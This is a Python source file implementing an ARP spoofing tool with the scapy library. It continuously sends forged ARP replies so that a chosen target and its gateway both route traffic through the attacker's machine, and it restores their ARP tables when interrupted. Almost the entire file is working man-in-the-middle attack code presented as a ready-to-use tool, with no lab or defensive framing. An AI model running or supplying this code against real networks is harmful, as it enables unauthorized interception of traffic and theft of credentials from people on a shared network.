import time

import scapy.all as scapy


class ArpSpoofer:
    def __init__(self, target_ip, gateway_ip, interval=4):
        """
        Initialize the ARP Spoofer with the target IP and gateway IP.
        :param target_ip: The IP address of the target.
        :param gateway_ip: The IP address of the gateway (router).
        :param interval: The interval between sending spoofing packets (in seconds).
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interval = interval

    def get_mac(self, ip):
        """Get the MAC address of a device using its IP address."""
        return scapy.getmacbyip(ip)

    def spoof(self, target_ip, spoof_ip):
        """
        Send an ARP spoofing packet to the target, pretending to be the spoof_ip (either gateway or target).
        :param target_ip: The IP address to send the spoofed ARP response to.
        :param spoof_ip: The IP address that the target should believe the packet is from.
        """
        packet = scapy.ARP(
            op=2, pdst=target_ip, hwdst=self.get_mac(target_ip), psrc=spoof_ip
        )
        scapy.send(packet, verbose=False)

    def restore(self, destination_ip, source_ip):
        """
        Restore the normal ARP table by sending the correct ARP response.
        :param destination_ip: The IP address whose ARP table we want to fix.
        :param source_ip: The real IP address associated with this IP.
        """
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(
            op=2,
            pdst=destination_ip,
            hwdst=destination_mac,
            psrc=source_ip,
            hwsrc=source_mac,
        )
        scapy.send(packet, verbose=False)

    def start(self):
        """Start the ARP spoofing attack by continuously sending spoofed packets."""
        try:
            print(
                f"[*] Starting ARP spoofing. Target: {self.target_ip}, Gateway: {self.gateway_ip}"
            )
            while True:
                self.spoof(
                    self.target_ip, self.gateway_ip
                )  # Spoof the target to think we are the gateway
                self.spoof(
                    self.gateway_ip, self.target_ip
                )  # Spoof the gateway to think we are the target
                print(
                    f"[*] Sent spoof packets to {self.target_ip} and {self.gateway_ip}"
                )
                time.sleep(self.interval)
        except KeyboardInterrupt:
            print("\n[!] Detected CTRL+C ... Restoring ARP tables.")
            self.restore(self.target_ip, self.gateway_ip)
            self.restore(self.gateway_ip, self.target_ip)
            print("[*] ARP tables restored. Exiting...")
